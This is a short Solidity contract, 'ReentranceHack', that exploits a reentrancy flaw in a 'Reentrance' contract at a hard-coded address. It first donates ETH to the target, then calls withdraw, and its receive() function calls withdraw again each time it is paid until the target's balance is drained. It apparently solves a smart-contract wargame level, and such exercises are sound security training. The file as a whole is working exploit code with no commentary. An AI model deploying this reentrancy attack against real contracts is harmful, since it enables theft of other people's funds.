// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.3/contracts/math/SafeMath.sol";
import "./reentrance.sol";


contract ReentranceHack {

    Reentrance r = Reentrance(0x17852A8cd6c622664bb573f3aBeAB5c3A5582136);

    constructor() public payable {
        (bool s,) = address(r).call{value:msg.value}(
                abi.encodeWithSignature("donate(address)", address(this))
            );
        require(s, "fail");

    }

    function hack() external payable {
        (bool s,) = address(r).call(
                abi.encodeWithSignature("withdraw(uint256)", msg.value)
            );
        require(s, "fail");
    }

    receive() external payable {
        if (address(r).balance >= msg.value){
            (bool s,) = address(r).call(
                        abi.encodeWithSignature("withdraw(uint256)", msg.value)
                    );
            require(s, "fail");
      }
  }
}